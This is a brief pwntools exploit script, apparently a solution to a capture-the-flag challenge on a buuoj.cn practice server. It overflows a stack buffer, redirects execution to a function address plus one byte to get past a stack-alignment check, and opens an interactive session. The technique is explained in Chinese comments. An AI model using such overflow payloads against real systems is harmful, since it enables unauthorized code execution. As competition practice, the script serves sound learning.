from pwn5 import *


r = remote('node5.buuoj.cn', 28711)

func_addr = 0x401186

'''
system中可能存在强制要求“栈对齐”的函数，导致了程序崩溃
那么不违反规定的方法就是：直接进入函数的第二行命令 +1
我们就利用了“栈对齐”只是检查函数的入口，对函数执行的部分是不强制要求的
'''
payload = b"a" * 0xf + b"b" * 8 + p64(func_addr + 1)

r.sendline(payload)

r.interactive()
